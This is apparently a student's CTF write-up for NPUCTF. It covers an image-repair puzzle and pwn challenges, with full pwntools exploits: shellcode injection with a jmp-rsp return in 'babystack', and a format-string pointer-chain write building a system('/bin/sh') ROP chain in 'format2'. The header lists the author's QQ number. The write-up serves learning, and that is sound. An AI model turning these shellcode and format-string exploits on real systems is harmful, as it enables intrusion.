# NPUCTF-校内

<table>
    <tr>
    <td>昵称</td>
    <td>luooofan</td>
    </tr>
    <tr>
    <td>QQ</td>
    <td>810446851</td>
 	</tr>
</table>


## Misc-打不开的图片

- 下载文件后加后缀zip解压得到`what's_this`
- `010Editor`查看文件头标志，发现应该是png，修复一下
- 发现图片宽度为0，利用crc校验码爆破出图片宽度为439
- 修改后打开得到一串字符`MZWGCZ33OV2HC3D5`
- 用base32解码得到`flag{utql}`（讲真那个O看成零自闭了）



## PWN

### 1.nc_pwn

 nc 连接得到flag

### 2.babystack

- 首先`checksec`

  ![image-20200422233651423](D:\文档\音视频图片\照片图片\typoraphoto\NPUCTFWP\image-20200422233651423.png)

- ida打开分析

  ![image-20200422234230103](D:\文档\音视频图片\照片图片\typoraphoto\NPUCTFWP\image-20200422234230103.png)

- 疯狂明示的shellcode：（关键部分用它就可`shellcode=asm(shellcraft.sh())`）

  - 先填充一段`nop(0x90)`

  - 然后跟直接asm()函数得到的`shellcode`

  - 然后计算位置并填充字符填到rbp+8也就是返回地址的位置

  - 返回地址这里要控制程序返回到rsp，以便执行下一条指令，即这里填充`p64(0x40064b)`

    ![image-20200422235451627](D:\文档\音视频图片\照片图片\typoraphoto\NPUCTFWP\image-20200422235451627.png)

  - 控制程序rip到这里执行：`sub rsp,0x90; jmp rsp;`
    嗯？
    1.为什么是0x90？差不多写了一个，毕竟咱有nop填充
    2.怎么得到的汇编？gdb调试的时候看到的，直接拿过来用了
    3.exp里为什么有循环？
    因为这样构造的shellcode本地可以跑通，但是服务器上不行，服务器上会把程序控制回havafun()函数再次执行。查看ida后发现或许是有个偏差？偏差范围比较小，就直接暴力循环试一下，试了几次成了，于是有了下面的饱含迷茫与运气的exp

- ```python
  from pwn import *
  
  jmp_rsp_base=0x40064b+0x64b-0x537-0x40 #为啥要减0x40,不待算了随便写的
  DEBUG=0
  
  for i in range(1,100):
      if DEBUG==1:
          sh=process('/mnt/hgfs/ctf/pwnstack')
      else:
          sh=remote('ha1cyon-ctf.fun',port)
      
      context.log_level='info'
      context(os='linux',arch='amd64')
      log.info("this is:"+str(i))
      
      jmp_rsp=jmp_rsp_base+i
      
      shellcode=asm(shellcraft.sh())
      payload=p64(0x9090909090909090)*5+shellcode+(0x60-len(shellcode))*'a'+p64(jmp_rsp)+p64(0xe4ff90c48348)
      print(shellcode)
      sh.sendafter('shellcode:\n',payload)
      
      sh.interactive()
  ```
  
  


### 3.format2

- 首先`checksec`

  ![image-20200422204504696](D:\文档\音视频图片\照片图片\typoraphoto\NPUCTFWP\image-20200422204504696.png)

  开启了`NX堆栈不可执行`，`PIE地址随机化`，还有`Full RELRO`，无法修改got表，没有开`canary`保护

- ida打开分析

  ![image-20200422210644228](D:\文档\音视频图片\照片图片\typoraphoto\NPUCTFWP\image-20200422210644228.png)

  格式化字符串溢出没跑了，双击`buf`可以看到`buf`在**bss段**，也就是说，循环读入0x64字节数据到`bss`段中，然后`printf`输出；如果输入等于`"66666666"`，跳出循环。

- 漏洞点找到了，这个时候思路大概是：

  - 利用printf溢出数据，such as：main返回地址，got表函数地址
  - 通过`LibcSearcher`计算得到libc基址，system函数地址和/bin/sh地址
  - 通过`ROPgadget`得到`pop rdi;ret;`地址
  - 构造ROP链，最后发送`"66666666"`，程序跳出循环，main返回到`system`函数，get shell
  
- 但是buf不在栈内，在bss段中，这就意味着没有办法像之前一样通过输入地址到栈中来实现任意读写，这个时候我们看向**printf 成链攻击**

- gdb调试

  - 输入`%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p`
  
- ![image-20200422214432013](D:\文档\音视频图片\照片图片\typoraphoto\NPUCTFWP\image-20200422214432013.png)
  
  - 可以看到，前几个是传参寄存器的值
    
  第六个(`%6$p`)指向main函数之后的`__libc_csu_init()`，可以溢出该数据，然后经过计算得到buf、pop_rdi_ret的实际地址
  
    第七个(`%7$p`)指向main函数返回地址**__libc_start_main()的231偏移处**，溢出该值，可以计算得到`__libc_start_main()`的起始地址，进而得到`libc基址和system函数地址`
    
    ```python
    # get pop_rdi_ret and ret(这里的ret之后再说)
    sh.sendline('%6$p')
    pop_rdi_ret=int(sh.recv()[0:-1],16)-0x30+0x93
    ret=pop_rdi_ret-0x893+0x626
    
    log.info("pop_rdi_ret   --> [%s]"%hex(pop_rdi_ret))
    
    # get ret_addr————__libc_csu_init()+231
    sh.sendline('%7$p')
    ret_addr=int(sh.recv()[0:-1],16)
    
    log.info("ret_addr    --> [%s]"%hex(ret_addr))
    
    # get libcbase and system_addr
    libc_start_main=ret_addr-231
    libc=LibcSearcher('__libc_start_main',libc_start_main)
    libcbase=libc_start_main-libc.dump('__libc_start_main')
    
    log.info("libc_base   --> [%s]"%hex(libcbase))
    
    system_addr=libcbase+libc.dump('system')
    log.info("system_addr --> [%s]"%hex(system_addr))
    ```
  
- 但是我们不仅要读出来还要写进去啊，来看栈结构：
  
  ![stack](D:\文档\音视频图片\照片图片\typoraphoto\NPUCTFWP\TIM图片20200422220839.png)
  
  也就是说：**可以通过`...%9$n`来改写 0x7fffffffded8(第一个框)地址 所指向的 0x7fffffffdfa8(第二个框)中所存的数据**
  
  就好比以第一个框为跳板，改写第二个框中数据（通过**...%9$n**），使其指向我们想要修改的地址，然后通过第二个框 来改写 我们想要修改的地址处的数据（通过**...%35$n**）
  
  这就好办了，我们想要修改的地址就是**从main的返回地址开始**的一条ROP链，也就是从图中第二行开始，预计是（之所以说预计是因为后面会有小修改）
  
    - 改`dec8`（设为addr1）：pop_rdi_ret的地址
    - 改`ded0`（设为addr2）：/bin/sh字符串的地址
    - 改`ded8`（设为addr3）：system函数的地址
  
- 我们来缕一缕怎么实现这几个写操作：
  
    - 首先溢出`ded8`处的数据，通过**%9$p**即可，目的是得到当前栈的位置
    
    - 溢出该数据后，可以通过运算得到当前栈中(rbp+8)的地址，也就是上面说的**addr1**
      
      同时可以得到addr2，addr3的地址（是栈的地址而不是栈中存储的地址）
      
    - **注意：这里为了方便易看直接写成%int(...)c%xx$n的形式，同时也基于code的时候把细节实现封装为函数，实际上并非如此，详见代码**
    
    - 通过 **%int(addr1)c%9$n** 使`dfa8`指向 **addr1**
      
      通过 **%int(pop_rdi_ret)c%35$n** 将addr1中存储的数据改为 **pop_rei_ret指令段的地址**
      
    - 通过 **%int(addr2)c%9$n** 使`dfa8`指向 **addr2**
      
      通过 **%int(binsh_ret)c%35$n** 将addr1中存储的数据改为 **binsh字符串的地址**
      
    - 诶这里好像出现个问题，我们是通过`ded8`为跳板来实现任意地址写操作的，现在按预计来说要改`ded8`的地址，那岂不是乱套了？不慌，既然我们可以任意地址写，那就造一个新的跳板
    
    - 通过 **%int(addr1+32)c%9$n** 使`dfa8`指向 **addr1+32** 
      
    通过 **%int(addr3)c%35$n** 将addr1+32中存储的数据改为 **addr1**
    
    造了一个新的跳板addr1+32，也就是说我们只要借助的跳板不是%9而是%11
    
    我们把它设为addr5，同时把addr1+24设为addr4
    
  - 通过 **%int(addr3)c%11$n** 使`dfa8`指向 **addr3**
    
    通过 **%int(ret)c%35$n** 将addr3中存储的数据改为 **ret**
    
    这里的`ret`就是之前代码中得到的`ret`，是ret指令的地址，至于为何多这一步稍后再说
    
  - 通过 **%int(addr4)c%11$n** 使`dfa8`指向 **addr4**
  
    通过 **%int(system_addr)c%35$n** 将addr3中存储的数据改为 **system函数地址**
  
  
  
  好，经过这些操作之后，我们应该就成了，先来看看代码：
  
    ```python
    # setvalue(addr,data)
    # 该函数通过control控制的跳板将dfa8指向参数1:addr,然后将addr的数据更改为参数2:data
    # 函数内部实际上是通过循环 %..c%xx$hn 来实现的
    
    control=9 #初始跳板 %9
    setvalue(ret_stackaddr,pop_rdi_ret)  #1 改addr1为pop_rdi_ret
    
    binsh_addr=pop_rdi_ret-0x893+0x201080#binsh字符串地址
    
    setvalue(ret_stackaddr+8,binsh_addr) #2 改addr2为binsh_addr
    
    setvalue(ret_stackaddr+32,work_addr) #3 创建新的跳板addr5
    
    control=11 #新跳板 %11
    setvalue(ret_stackaddr+16,ret)       #4 改addr3为ret指令地址
    setvalue(ret_stackaddr+24,system_addr)  #5 改addr4为system函数地址
    ```
  
  到这里有必要先说一下**/bin/sh字符串的地址**了，因为输入的字符串会存到bss段中的buf里去，buf肯定是可读可写的，所以我们可以把/bin/sh字符串存到buf中去；并且因为最后需要传送”66666666“来控制循环结束，所以我们把/bin/sh字符串存到buf的靠中间的位置
  
- 总算快要结束了，先处理一下遗留问题，之前发的两段代码中都有关于ret的操作。
  
  第一份代码中`ret=pop_rdi_ret-0x893+0x626`，这步其实就是先通过ROPgadget获取到单一个ret指令的地址，然后运算得出实际地址
  
  第二份代码中就是比预计的ROP链多了一环：
    我们一开始预计的链是这样的：
  
    ```mermaid
    graph LR
    	id1(pop_rdi_ret) --> id2(binsh_addr)
    	id2 --> id3(system_addr)
    ```
    那么我们现在的链是这样的
    ```mermaid
    graph LR
    	id1(pop_rdi_ret) --> id2(binsh_addr)
    	id2 --> id3(ret)
    	id3 --> id4(system_addr)
    ```
  
    为什么要这样做呢？因为不添这一环的话，程序会因为段错误退出，经过gdb调试后发现是在`system()`函数调用到`do_system()`函数的时候，在执行**movaps xmmword ptr [rsp + 0x40], xmm0**指令时，指令要求rsp+0x40的值要对齐16bytes，否则会直接触发中断从而crash。
    解决办法就是在构造ROP链的时候多加一个`ret`，从而使得执行到那条指令的时候rsp是对齐的。
  
- 附上exp：

    ```python
    from pwn import *
    from LibcSearcher import LibcSearcher
    
    DEBUG=0
    if DEBUG==1:
        sh=process('/mnt/hgfs/ctf/pwn1')
    else:
        sh=remote('ha1cyon-ctf.fun',port)
    
    context.log_level='info'#'debug'
    
    # get pop_rdi_ret and ret
    sh.sendline('%6$p')
    pop_rdi_ret=int(sh.recv()[0:-1],16)-0x30+0x93
    ret=pop_rdi_ret-0x893+0x626
    
    log.info("pop_rdi_ret   --> [%s]"%hex(pop_rdi_ret))
    
    # get ret_stackaddr
    sh.sendline('%9$p')
    work_addr=int(sh.recv()[0:-1],16)#$35
    ret_stackaddr=work_addr-8*(35-7)#$7
    
    log.info("ret_stackaddr --> [%s]"%hex(ret_stackaddr))
    
     
    # get ret_addr
    sh.sendline('%7$p')
    ret_addr=int(sh.recv()[0:-1],16)
    
    log.info("ret_addr    --> [%s]"%hex(ret_addr))
    
    # get libcbase and system_addr
    libc_start_main=ret_addr-231
    libc=LibcSearcher('__libc_start_main',libc_start_main)
    libcbase=libc_start_main-libc.dump('__libc_start_main')
    
    log.info("libc_base   --> [%s]"%hex(libcbase))
    
    system_addr=libcbase+libc.dump('system')
    #binsh_addr=libcbase+libc.dump('str_bin_sh')
    
    log.info("system_addr --> [%s]"%hex(system_addr))
    
    def set2location(addr):
        global sh
        global control
        sh.sendline('%'+str(addr)+'c%'+str(control)+'$hn')
        sh.recv()
        checkOK()
    
    def override(data):
        global sh
        sh.sendline('%'+str(data)+'c%35$hn')
        sh.recv()
        checkOK()
    
    def checkOK():
        sleep(3)
        while True:
            sh.send('ok?\x00')
            sleep(0.5)
            data=sh.recv()
            if data.find('ok?')!=-1:
                break
    
    def setvalue(addr,data):
        for offset in [0,2,4,6]:
            set2location((addr+offset)&0xffff)
            param=(data>>(8*offset))&0xffff
            #gdb.attach(sh)
            #pause()
            if param==0:
                param=65536
            override(param)
            #gdb.attach(sh)
            #pause()
            log.info("  finished:"+str(offset//2+1))
    
    #setvalue(ret_stackaddr+16,system_addr)
    control=9
    setvalue(ret_stackaddr+32,work_addr)
    
    setvalue(ret_stackaddr,pop_rdi_ret)
    
    binsh_addr=pop_rdi_ret-0x893+0x201080
    
    setvalue(ret_stackaddr+8,binsh_addr)
    
    control=11
    setvalue(ret_stackaddr+16,ret)
    setvalue(ret_stackaddr+24,system_addr)
    
    if DEBUG==1:
        gdb.attach(sh)
        pause()
    
    context.log_level='debug'
    
    # push /bin/sh to .bss
    sh.sendline(' '*64+'/bin/sh\x00')
    sh.recv()
    
    sh.send('66666666\x00')
    
    sh.interactive()
    ```

    







